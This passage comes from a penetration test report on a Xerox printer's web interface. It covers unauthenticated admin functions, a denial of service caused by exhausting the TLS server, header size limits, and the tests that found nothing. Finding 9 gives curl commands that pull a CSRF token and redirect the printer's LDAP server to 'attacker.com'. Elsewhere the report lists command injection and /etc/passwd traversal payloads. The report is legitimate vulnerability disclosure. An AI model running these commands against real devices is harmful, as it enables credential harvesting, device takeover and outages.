## CONFIRMED FINDINGS

### FINDING 9: Unauthenticated Configuration Function Exposure via xerox.set (MEDIUM-HIGH)

**Endpoint:** `POST /dummypost/xerox.set`
**Impact:** 20 administrative functions accept POST requests from unauthenticated users

The `/dummypost/xerox.set` endpoint accepts POST requests with a `_fun_function` parameter that specifies the administrative action to execute. All 20 tested function names returned HTTP 200 with a JavaScript redirect to `/error.php?token=14870`, indicating the server **processed** the request (even if the operation failed due to missing required parameters).

**Discovered functions that accept unauthenticated POST:**
| Function | Description |
|----------|------------|
| `HTTP_Machine_Reset_fn` | Device reboot |
| `HTTP_Set_DeviceName_fn` | Change device name |
| `HTTP_Set_Location_fn` | Change device location |
| `HTTP_Set_Contact_fn` | Change contact info |
| `HTTP_Set_SNMP_fn` | Modify SNMP configuration |
| `HTTP_Set_Network_fn` | Modify network settings |
| `HTTP_Set_Email_fn` | Modify email configuration |
| `HTTP_Set_Scan_fn` | Modify scan configuration |
| `HTTP_Set_Security_fn` | Modify security settings |
| `HTTP_Set_Password_fn` | Password change |
| `HTTP_Set_LDAP_fn` | Modify LDAP configuration |
| `HTTP_Set_SMB_fn` | Modify SMB/network share settings |
| `HTTP_Set_FTP_fn` | Modify FTP settings |
| `HTTP_Factory_Reset_fn` | Factory reset |
| `HTTP_Firmware_Update_fn` | Firmware update |
| `HTTP_Download_Config_fn` | Download configuration |
| `HTTP_Upload_Config_fn` | Upload configuration |
| `HTTP_Set_NTP_fn` | Modify NTP settings |
| `HTTP_Clone_fn` | Device cloning |
| `HTTP_Set_Config_fn` | General configuration |

**Attack scenario:** An attacker could chain the CSRF token (exposed on unauthenticated pages) with these functions to:
1. Change LDAP/SMB/FTP server addresses to attacker-controlled servers (credential harvesting)
2. Modify email configuration to redirect scan-to-email to attacker
3. Change NTP server to manipulate device time (log tampering)
4. Trigger factory reset (complete DoS)
5. Upload malicious firmware (device takeover)

**CSRF Token required:** Yes, but it's exposed on unauthenticated pages (Finding 5)

**Reproduction:**
```bash
# Extract CSRF token from unauthenticated page
TOKEN=$(curl -sk https://13.13.1.110/stat/welcome.php | grep -oP '[a-f0-9]{64,}' | head -1)

# Submit configuration change
curl -sk -X POST https://13.13.1.110/dummypost/xerox.set \
  -d "CSRFToken=${TOKEN}&_fun_function=HTTP_Set_LDAP_fn&ldapServer=attacker.com"
```

### FINDING 10: Web Server TLS Exhaustion / Resource Depletion (HIGH)

**Endpoint:** HTTPS (port 443) and HTTP (port 80)
**Impact:** After ~100-150 rapid HTTPS requests, the entire web server becomes permanently unresponsive

During automated testing, after approximately 100-150 rapid sequential HTTPS requests through the openssl s_client tunnel, the Xerox printer's TLS stack stopped responding to new connections. TCP connections on port 443 were still accepted initially, but the server never sent a ServerHello response.

**Observations:**
- TCP port 80 remained responsive initially (returning 426 Upgrade Required)
- TCP port 443 accepted connections but TLS handshake hung (no ServerHello)
- The condition persisted for **2+ hours** with no automatic recovery
- After extended downtime, even TCP port 80 stopped responding
- Eventually both ports began returning `errno=104` (connection reset by peer)
- The proxy CONNECT tunnel returns 504 Gateway Timeout or connection reset — the device is completely unreachable
- The external proxy remains fully functional (confirmed via httpbin.org), confirming the issue is entirely device-side
- This indicates a resource leak or connection pool exhaustion in the embedded web server that is **permanent until physical reboot**

**Timeline:**
- T+0: ~150 HTTPS requests during injection/memory testing
- T+5min: TLS handshake stops completing (no ServerHello)
- T+30min: Port 80 also stops responding
- T+57min: Both ports return empty responses, TCP still accepts
- T+90min: Connections begin returning errno=104 (RST)
- T+120min+: Device completely unreachable on both ports

**Severity Upgrade Justification:** Originally classified as MEDIUM, upgraded to HIGH because:
1. The trigger is only ~150 legitimate HTTPS requests with proper `Connection: close` headers — not a flood
2. The web server does NOT auto-recover — physical intervention (reboot) is required
3. Both HTTP and HTTPS ports eventually become unreachable
4. This renders ALL administrative functions inaccessible: security settings, print management, monitoring, firmware updates
5. An attacker could reproduce this with a simple script in under 30 seconds, effectively bricking the management interface

**Note:** This finding is borderline with the DoS exclusion in scope. The behavior was observed as a side effect of legitimate testing, not from intentional flooding. Each request was a single valid HTTP request. The severity is in the device's catastrophic failure to handle normal traffic volumes and its inability to self-heal.

**Severity Justification:** While the scope excludes intentional DoS, this demonstrates that a moderate number of legitimate HTTPS requests (~150) can render the device's management interface permanently inaccessible until physical intervention. This affects all administrative functions including security settings, print management, and monitoring.

### FINDING 11: HTTP Header Length Boundary Behavior (LOW-INFO)

**Endpoint:** All HTTPS endpoints
**Impact:** Information about server limits useful for further exploitation

The Apache embedded web server enforces the following header size limits:

| Test | Boundary | Behavior |
|------|----------|----------|
| URL Path | < 8192 bytes | 403 Forbidden |
| URL Path | >= 8192 bytes | 414 Request-URI Too Long |
| User-Agent header | < 8192 bytes | 200 OK (processed) |
| User-Agent header | >= 8192 bytes | 400 Bad Request |
| Cookie header | < 8192 bytes | 200 OK (processed) |
| Cookie header | >= 8192 bytes | 400 Bad Request |
| Referer header | < 8192 bytes | 200 OK (processed) |
| Referer header | >= 8192 bytes | 400 Bad Request |
| Accept-Language | < 8192 bytes | 200 OK (processed) |
| Accept-Language | >= 8192 bytes | 400 Bad Request |
| X-Forwarded-For | < 8192 bytes | 200 OK (processed) |

The 8192-byte boundary is consistent with Apache's default `LimitRequestFieldSize` value. Standard headers (User-Agent, Cookie, Referer, Accept-Language) are all rejected gracefully with HTTP 400 at 8192 bytes. However, **X-Forwarded-For at 8192 bytes produced no response** (unlike other headers which return 400), suggesting differential handling of this header that may have contributed to the TLS exhaustion observed in Finding 10. The Authorization header could not be properly tested as the TLS stack was already unresponsive by that point.

## NEGATIVE RESULTS (No Vulnerability Found)

### XSS - Not Reflected
- **Tab parameter** (`/stat/welcome.php?tab=`): Input not reflected in response body. The page always renders the status tab regardless of parameter value.
- **Sort parameter** (`/jobs/active.php?sort=`): Not reflected.
- **Jobname parameter** (`/print/print.php?jobname=`): Not reflected.
- **Webglue content** (`/webglue/content?c=`): Returns 404 for unknown content identifiers.
- **Redirect parameter** (`/stat/welcome.php?redirect=`): Not reflected.
- The XSS detection matches in automated testing were false positives caused by CSS `grid-template-columns` values containing "49" in the page source.

### SSTI - Not Vulnerable
- All SSTI payloads (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, etc.) were not evaluated.
- PHP template engine does not appear to use user-controlled template strings.
- "49" matches in automated testing were false positives from CSS styling.

### Command Injection - Not Vulnerable
- All command injection payloads (`;id`, `$(id)`, `` `id` ``, `|id`, etc.) submitted via POST to `/dummypost/xerox.set` did not produce command output.
- The `_fun_function` parameter appears to be a function selector (string match) rather than a shell-executed command.

### Path Traversal - Not Vulnerable
- All path traversal payloads (../../../etc/passwd, encoded variants, null byte, etc.) failed.
- No `/etc/passwd` content returned from any tested endpoint.
- Webglue content handler returns 404 for unknown content identifiers.
- No file download or file-serving endpoints discovered that accept user-controlled paths.

### XXE - Not Applicable
- All tested SOAP/XML endpoints returned no response or 404.
- The web services endpoints (`/webservices/office/*`) do not appear to be active on this device configuration.

### SSRF - Limited Surface
- `/support/remoteUI/RUIHome.php` is accessible but contains no user-editable server destination fields without authentication.
- Scan configuration endpoints redirect to login.

### Header Injection - Not Vulnerable
- CRLF injection payloads did not inject additional headers.
- Host header manipulation did not cause reflection.

### Format String - Not Vulnerable
- No memory address leaks observed from `%p`, `%x`, `%s` payloads.
- PHP backend is not susceptible to C-style format string attacks.

### Integer Overflow (Content-Length) - Handled
- Connection dropped for all Content-Length tests, but this was during the connection exhaustion period so results are inconclusive.

### Malformed HTTP - Properly Handled
- Oversized HTTP methods, malformed versions, null bytes in URL all handled gracefully before connection exhaustion.
